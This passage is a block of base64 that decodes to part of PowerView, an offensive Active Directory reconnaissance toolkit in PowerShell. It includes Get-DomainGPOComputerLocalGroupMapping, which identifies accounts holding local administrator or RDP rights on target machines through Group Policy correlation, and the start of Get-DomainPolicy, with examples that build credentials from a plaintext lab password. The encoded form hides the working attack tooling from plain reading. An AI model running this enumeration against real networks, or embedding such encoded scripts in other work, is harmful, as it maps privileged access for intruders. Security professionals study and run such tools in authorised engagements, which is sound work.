ICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9HdWlkJyAkR1BPR3VpZAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAkR1BPVHlwZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb250YWluZXJOYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRfLnNpdGVvYmplY3RibAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuQWRkKCdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmcgewo8IwouU1lOT1BTSVMKClRha2VzIGEgY29tcHV0ZXIgKG9yIEdQTykgb2JqZWN0IGFuZCBkZXRlcm1pbmVzIHdoYXQgdXNlcnMvZ3JvdXBzIGFyZSBpbiB0aGUgc3BlY2lmaWVkCmxvY2FsIGdyb3VwIGZvciB0aGUgbWFjaGluZSB0aHJvdWdoIEdQTyBjb3JyZWxhdGlvbi4KCkF1dGhvcjogQGhhcm1qMHkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgR2V0LURvbWFpbk9VLCBHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSwgR2V0LURvbWFpblNpdGUsIEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBpcyB0aGUgaW52ZXJzZSBvZiBHZXQtRG9tYWluR1BPVXNlckxvY2FsR3JvdXBNYXBwaW5nLCBhbmQgZmluZHMgd2hhdCB1c2Vycy9ncm91cHMKYXJlIGluIHRoZSBzcGVjaWZpZWQgbG9jYWwgZ3JvdXAgZm9yIGEgdGFyZ2V0IG1hY2hpbmUgdGhyb3VnaCBHUE8gY29ycmVsYXRpb24uCgpJZiBhIC1Db21wdXRlcklkZW50aXR5IGlzIHNwZWNpZmllZCwgcmV0cmlldmUgdGhlIGNvbXBsZXRlIGNvbXB1dGVyIG9iamVjdCwgYXR0ZW1wdCB0bwpkZXRlcm1pbmUgdGhlIE9VIHRoZSBjb21wdXRlciBpcyBhIHBhcnQgb2YuIFRoZW4gcmVzb2x2ZSB0aGUgY29tcHV0ZXIncyBzaXRlIG5hbWUgd2l0aApHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSBhbmQgcmV0cmlldmUgYWxsIHNpdGVzIG9iamVjdCBHZXQtRG9tYWluU2l0ZS4gRm9yIHRob3NlIHJlc3VsdHMsIGF0dGVtcHQgdG8KZW51bWVyYXRlIGFsbCBsaW5rZWQgR1BPcyBhbmQgYXNzb2NpYXRlZCBsb2NhbCBncm91cCBzZXR0aW5ncyB3aXRoIEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwLiBGb3IKZWFjaCByZXN1bHRpbmcgR1BPIGdyb3VwLCByZXNvbHZlIHRoZSByZXN1bHRpbmcgdXNlci9ncm91cCBuYW1lIHRvIGEgZnVsbCBBRCBvYmplY3QgYW5kCnJldHVybiB0aGUgcmVzdWx0cy4gVGhpcyB3aWxsIHJldHVybiB0aGUgZG9tYWluIG9iamVjdHMgdGhhdCBhcmUgbWVtYmVycyBvZiB0aGUgc3BlY2lmaWVkCi1Mb2NhbEdyb3VwIGZvciB0aGUgZ2l2ZW4gY29tcHV0ZXIuCgpPdGhlcndpc2UsIGlmIC1PVUlkZW50aXR5IGlzIHN1cHBsaWVkLCB0aGUgc2FtZSBwcm9jZXNzIGlzIGV4ZWN1dGVkIHRvIGZpbmQgbGlua2VkIEdQT3MgYW5kCmxvY2FsZ3JvdXAgc3BlY2lmaWNhdGlvbnMuCgouUEFSQU1FVEVSIENvbXB1dGVySWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gV0lORE9XUzEwJCksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPVdJTkRPV1MxMCxDTj1Db21wdXRlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMjQpLCBHVUlEIChlLmcuIDRmMTZiNmJjLTcwMTAtNGNiZi1iNjI4LWYzY2ZlMjBmNjk5NCksCm9yIGEgZG5zIGhvc3QgbmFtZSAoZS5nLiB3aW5kb3dzMTAudGVzdGxhYi5sb2NhbCkgZm9yIHRoZSBjb21wdXRlciB0byBpZGVudGl0eSBHUE8gbG9jYWwgZ3JvdXAgbWFwcGluZ3MgZm9yLgoKLlBBUkFNRVRFUiBPVUlkZW50aXR5CgpBbiBPVSBuYW1lIChlLmcuIFRlc3RPVSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIE9VPVRlc3RPVSxEQz10ZXN0bGFiLERDPWxvY2FsKSwgb3IKR1VJRCAoZS5nLiA4YTliYTIyYS04OTc3LTQ3ZTYtODRjZS04YzI2YWY0ZTFlNmEpIGZvciB0aGUgT1UgdG8gaWRlbnRpdHkgR1BPIGxvY2FsIGdyb3VwIG1hcHBpbmdzIGZvci4KCi5QQVJBTUVURVIgTG9jYWxHcm91cAoKVGhlIGxvY2FsIGdyb3VwIHRvIGNoZWNrIGFjY2VzcyBhZ2FpbnN0LgpDYW4gYmUgIkFkbWluaXN0cmF0b3JzIiAoUy0xLTUtMzItNTQ0KSwgIlJEUC9SZW1vdGUgRGVza3RvcCBVc2VycyIgKFMtMS01LTMyLTU1NSksCm9yIGEgY3VzdG9tIGxvY2FsIFNJRC4gRGVmYXVsdHMgdG8gbG9jYWwgJ0FkbWluaXN0cmF0b3JzJy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBlbnVtZXJhdGUgR1BPcyBmb3IsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmcgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMy50ZXN0bGFiLmxvY2FsCgpGaW5kcyB1c2VycyB3aG8gaGF2ZSBsb2NhbCBhZG1pbiByaWdodHMgb3ZlciBXSU5ET1dTMyB0aHJvdWdoIEdQTyBjb3JyZWxhdGlvbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWFwcGluZyAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1Db21wdXRlck5hbWUgV0lORE9XUzQuZGV2LnRlc3RsYWIubG9jYWwgLUxvY2FsR3JvdXAgUkRQCgpGaW5kcyB1c2VycyB3aG8gaGF2ZSBSRFAgcmlnaHRzIG92ZXIgV0lORE9XUzQgdGhyb3VnaCBHUE8gY29ycmVsYXRpb24uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmcgLUNyZWRlbnRpYWwgJENyZWQgLUNvbXB1dGVySWRlbnRpdHkgU1FMLnRlc3RsYWIubG9jYWwKCi5PVVRQVVRTCgpQb3dlclZpZXcuR0dQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkdHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVySWRlbnRpdHknKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVySWRlbnRpdHknLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0NvbXB1dGVyTmFtZScsICdDb21wdXRlcicsICdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdPVUlkZW50aXR5JyldCiAgICAgICAgW0FsaWFzKCdPVScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9VSWRlbnRpdHksCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBZG1pbmlzdHJhdG9ycycsICdTLTEtNS0zMi01NDQnLCAnUkRQJywgJ1JlbW90ZSBEZXNrdG9wIFVzZXJzJywgJ1MtMS01LTMyLTU1NScpXQogICAgICAgICRMb2NhbEdyb3VwID0gJ0FkbWluaXN0cmF0b3JzJywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbW1vbkFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb21tb25Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJJZGVudGl0eSddKSB7CiAgICAgICAgICAgICRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJENvbXB1dGVySWRlbnRpdHkgLVByb3BlcnRpZXMgJ2Rpc3Rpbmd1aXNoZWRuYW1lLGRuc2hvc3RuYW1lJwoKICAgICAgICAgICAgaWYgKC1ub3QgJENvbXB1dGVycykgewogICAgICAgICAgICAgICAgdGhyb3cgIltHZXQtRG9tYWluR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWFwcGluZ10gQ29tcHV0ZXIgJENvbXB1dGVySWRlbnRpdHkgbm90IGZvdW5kLiBUcnkgYSBmdWxseSBxdWFsaWZpZWQgaG9zdCBuYW1lLiIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlcnMpIHsKCiAgICAgICAgICAgICAgICAkR1BPR3VpZHMgPSBAKCkKCiAgICAgICAgICAgICAgICAjIGV4dHJhY3QgYW55IEdQT3MgbGlua2VkIHRvIHRoaXMgY29tcHV0ZXIncyBPVSB0aHJvdWdoIGdwTGluawogICAgICAgICAgICAgICAgJEROID0gJENvbXB1dGVyLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAkT1VJbmRleCA9ICRETi5JbmRleE9mKCdPVT0nKQogICAgICAgICAgICAgICAgaWYgKCRPVUluZGV4IC1ndCAwKSB7CiAgICAgICAgICAgICAgICAgICAgJE9VTmFtZSA9ICRETi5TdWJTdHJpbmcoJE9VSW5kZXgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJE9VTmFtZSkgewogICAgICAgICAgICAgICAgICAgICRHUE9HdWlkcyArPSBHZXQtRG9tYWluT1UgQENvbW1vbkFyZ3VtZW50cyAtU2VhcmNoQmFzZSAkT1VOYW1lIC1MREFQRmlsdGVyICcoZ3BsaW5rPSopJyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0LVN0cmluZyAtSW5wdXRPYmplY3QgJF8uZ3BsaW5rIC1QYXR0ZXJuICcoXHspezAsMX1bMC05YS1mQS1GXXs4fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17MTJ9KFx9KXswLDF9JyAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHskXy5NYXRjaGVzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVmFsdWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGV4dHJhY3QgYW55IEdQT3MgbGlua2VkIHRvIHRoaXMgY29tcHV0ZXIncyBzaXRlIHRocm91Z2ggZ3BMaW5rCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyB0aGUgc2l0ZW5hbWUgZm9yOiAkKCRDb21wdXRlci5kbnNob3N0bmFtZSkiCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJTaXRlID0gKEdldC1OZXRDb21wdXRlclNpdGVOYW1lIC1Db21wdXRlck5hbWUgJENvbXB1dGVyLmRuc2hvc3RuYW1lKS5TaXRlTmFtZQogICAgICAgICAgICAgICAgaWYgKCRDb21wdXRlclNpdGUgLWFuZCAoJENvbXB1dGVyU2l0ZSAtbm90bWF0Y2ggJ0Vycm9yJykpIHsKICAgICAgICAgICAgICAgICAgICAkR1BPR3VpZHMgKz0gR2V0LURvbWFpblNpdGUgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJENvbXB1dGVyU2l0ZSAtTERBUEZpbHRlciAnKGdwbGluaz0qKScgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNlbGVjdC1TdHJpbmcgLUlucHV0T2JqZWN0ICRfLmdwbGluayAtUGF0dGVybiAnKFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfScgLUFsbE1hdGNoZXMgfCBGb3JFYWNoLU9iamVjdCB7JF8uTWF0Y2hlcyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFZhbHVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBwcm9jZXNzIGFueSBHUE8gbG9jYWwgZ3JvdXAgc2V0dGluZ3MgZnJvbSB0aGUgR1BPIEdVSUQgc2V0CiAgICAgICAgICAgICAgICAkR1BPR3VpZHMgfCBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCBAQ29tbW9uQXJndW1lbnRzIHwgU29ydC1PYmplY3QgLVByb3BlcnR5IEdQT05hbWUgLVVuaXF1ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgPSAkXwoKICAgICAgICAgICAgICAgICAgICBpZigkR1BPR3JvdXAuR3JvdXBNZW1iZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJEdQT0dyb3VwLkdyb3VwTWVtYmVycwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT01lbWJlcnMgPSAkR1BPR3JvdXAuR3JvdXBTSUQKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAQ29tbW9uQXJndW1lbnRzIC1JZGVudGl0eSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCgogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyLmRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0TmFtZScgJE9iamVjdC5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0U0lEJyAkXwogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPRGlzcGxheU5hbWUnICRHUE9Hcm91cC5HUE9EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0d1aWQnICRHUE9Hcm91cC5HUE9OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJEdQT0dyb3VwLkdQT1BhdGgKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAkR1BPR3JvdXAuR1BPVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyLlBTT2JqZWN0LlR5cGVOYW1lcy5BZGQoJ1Bvd2VyVmlldy5HUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXInKQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpblBvbGljeSB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyB0aGUgZGVmYXVsdCBkb21haW4gcG9saWN5IG9yIHRoZSBkb21haW4gY29udHJvbGxlciBwb2xpY3kgZm9yIHRoZSBjdXJyZW50CmRvbWFpbiBvciBhIHNwZWNpZmllZCBkb21haW4vZG9tYWluIGNvbnRyb2xsZXIuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5HUE8sIEdldC1HcHRUbXBsLCBDb252ZXJ0RnJvbS1TSUQgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgb3IgdGhlIGRvbWFpbiBjb250cm9sbGVyIHBvbGljeSBmb3IgdGhlIGN1cnJlbnQKZG9tYWluIG9yIGEgc3BlY2lmaWVkIGRvbWFpbi9kb21haW4gY29udHJvbGxlciB1c2luZyBHZXQtRG9tYWluR1BPLgoKLlBBUkFNRVRFUiBEb21haW4KClRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGRlZmF1bHQgcG9saWNpZXMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU291cmNlCgpFeHRyYWN0ICdEb21haW4nIG9yICdEQycgKGRvbWFpbiBjb250cm9sbGVyKSBwb2xpY2llcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFJlc29sdmVTaWRzCgpTd2l0Y2guIFJlc29sdmUgU2lkcyBmcm9tIGEgREMgcG9saWN5IHRvIG9iamVjdCBuYW1lcy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluUG9saWN5CgpSZXR1cm5zIHRoZSBkb21haW4gcG9saWN5IGZvciB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblBvbGljeSAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBkb21haW4gcG9saWN5IGZvciB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Qb2xpY3kgLVNvdXJjZSBEQyAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBwb2xpY3kgZm9yIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4gY29udHJvbGxlci4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpH